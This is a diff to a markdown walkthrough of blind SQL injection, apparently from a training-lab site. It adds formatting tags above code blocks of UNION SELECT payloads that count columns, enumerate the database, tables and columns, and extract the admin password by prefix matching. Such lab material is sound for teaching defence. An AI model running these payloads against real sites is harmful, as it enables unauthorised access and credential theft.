@@ -24,12 +24,14 @@ https://website.thm/checkuserusername=admin
 
 Observed true/false response:
 
+<!-- cmd: http -->
 ```json
 {"taken": true}
 ```
 
 Query shape:
 
+<!-- cmd: sql -->
 ```sql
 SELECT * FROM users WHERE username = '%username%' LIMIT 1;
 ```
@@ -38,6 +40,7 @@ SELECT * FROM users WHERE username = '%username%' LIMIT 1;
 
 ### 1. Find the column count
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1;--
 admin123' UNION SELECT 1,2;--
@@ -48,6 +51,7 @@ The first payload that flips the response to true identifies the valid column co
 
 ### 2. Enumerate the database name
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
 admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
@@ -58,6 +62,7 @@ Continue with prefixes such as `sa%`, `sb%`, `sc%` until the name is complete.
 
 ### 3. Enumerate tables
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables
 WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
@@ -65,6 +70,7 @@ WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
 
 Confirm exact table names once a prefix is found:
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables
 WHERE table_schema = 'sqli_three' AND table_name = 'users';--
@@ -72,6 +78,7 @@ WHERE table_schema = 'sqli_three' AND table_name = 'users';--
 
 ### 4. Enumerate columns
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
 WHERE TABLE_SCHEMA = 'sqli_three' AND TABLE_NAME = 'users' AND COLUMN_NAME LIKE 'a%';
@@ -79,12 +86,14 @@ WHERE TABLE_SCHEMA = 'sqli_three' AND TABLE_NAME = 'users' AND COLUMN_NAME LIKE 
 
 Exclude known columns while searching for the next one:
 
+<!-- cmd: sql -->
 ```sql
 AND COLUMN_NAME LIKE 'a%' AND COLUMN_NAME != 'id'
 ```
 
 ### 5. Extract values
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
 admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE 'a%';--
